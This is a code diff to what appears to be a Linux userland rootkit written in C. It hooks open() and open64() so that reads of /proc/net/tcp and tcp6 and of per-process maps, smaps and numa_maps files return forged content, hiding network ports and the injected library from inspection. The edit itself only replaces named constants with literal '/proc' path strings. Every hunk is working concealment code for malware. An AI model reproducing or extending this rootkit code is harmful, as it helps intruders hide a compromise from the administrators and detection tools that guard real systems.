@@ -21,7 +21,7 @@ int open(const char *pathname, int flags, mode_t mode){
      *  we can apply this to any file that a process may need to open. */
 
 #ifdef HIDE_PORTS
-    if(!strcmp(pathname, TCP_PATH) || !strcmp(pathname, TCP6_PATH))
+    if(!strcmp(pathname, "/proc/net/tcp") || !strcmp(pathname, "/proc/net/tcp6"))
         return fileno(forge_procnet(pathname));
 #endif
 
@@ -30,15 +30,15 @@ int open(const char *pathname, int flags, mode_t mode){
     if(!fnmatch(SMAPS_FULL_PATH, pathname, FNM_PATHNAME)) return fileno(forge_smaps(pathname));
     if(!fnmatch(NMAPS_FULL_PATH, pathname, FNM_PATHNAME)) return fileno(forge_numamaps(pathname));
 
-    char cwd[PATH_MAX];
+    char cwd[PROCPATH_MAXLEN];
     if(getcwd(cwd, sizeof(cwd)) != NULL){
-        if(!strcmp(cwd, PROC_PATH)){
+        if(!strcmp(cwd, "/proc")){
             if(!fnmatch(MAPS_PROC_PATH, pathname, FNM_PATHNAME)) return fileno(forge_maps(pathname));
             if(!fnmatch(SMAPS_PROC_PATH, pathname, FNM_PATHNAME)) return fileno(forge_smaps(pathname));
             if(!fnmatch(NMAPS_PROC_PATH, pathname, FNM_PATHNAME)) return fileno(forge_numamaps(pathname));
         }
 
-        if(!fnmatch(PROC_ALL_PATH, cwd, FNM_PATHNAME)){
+        if(!fnmatch("/proc/*", cwd, FNM_PATHNAME)){
             if(!fnmatch(MAPS_FILENAME, pathname, FNM_PATHNAME)) return fileno(forge_maps(pathname));
             if(!fnmatch(SMAPS_FILENAME, pathname, FNM_PATHNAME)) return fileno(forge_smaps(pathname));
             if(!fnmatch(NMAPS_FILENAME, pathname, FNM_PATHNAME)) return fileno(forge_numamaps(pathname));
@@ -73,7 +73,7 @@ int open64(const char *pathname, int flags, mode_t mode){
     }
 
 #ifdef HIDE_PORTS
-    if(!strcmp(pathname, TCP_PATH) || !strcmp(pathname, TCP6_PATH))
+    if(!strcmp(pathname, "/proc/net/tcp") || !strcmp(pathname, "/proc/net/tcp6"))
         return fileno(forge_procnet(pathname));
 #endif
 
@@ -82,15 +82,15 @@ int open64(const char *pathname, int flags, mode_t mode){
     if(!fnmatch(SMAPS_FULL_PATH, pathname, FNM_PATHNAME)) return fileno(forge_smaps(pathname));
     if(!fnmatch(NMAPS_FULL_PATH, pathname, FNM_PATHNAME)) return fileno(forge_numamaps(pathname));
 
-    char cwd[PATH_MAX];
+    char cwd[PROCPATH_MAXLEN];
     if(getcwd(cwd, sizeof(cwd)) != NULL){
-        if(!strcmp(cwd, PROC_PATH)){
+        if(!strcmp(cwd, "/proc")){
             if(!fnmatch(MAPS_PROC_PATH, pathname, FNM_PATHNAME)) return fileno(forge_maps(pathname));
             if(!fnmatch(SMAPS_PROC_PATH, pathname, FNM_PATHNAME)) return fileno(forge_smaps(pathname));
             if(!fnmatch(NMAPS_PROC_PATH, pathname, FNM_PATHNAME)) return fileno(forge_numamaps(pathname));
         }
 
-        if(!fnmatch(PROC_ALL_PATH, cwd, FNM_PATHNAME)){
+        if(!fnmatch("/proc/*", cwd, FNM_PATHNAME)){
             if(!fnmatch(MAPS_FILENAME, pathname, FNM_PATHNAME)) return fileno(forge_maps(pathname));
             if(!fnmatch(SMAPS_FILENAME, pathname, FNM_PATHNAME)) return fileno(forge_smaps(pathname));
             if(!fnmatch(NMAPS_FILENAME, pathname, FNM_PATHNAME)) return fileno(forge_numamaps(pathname));
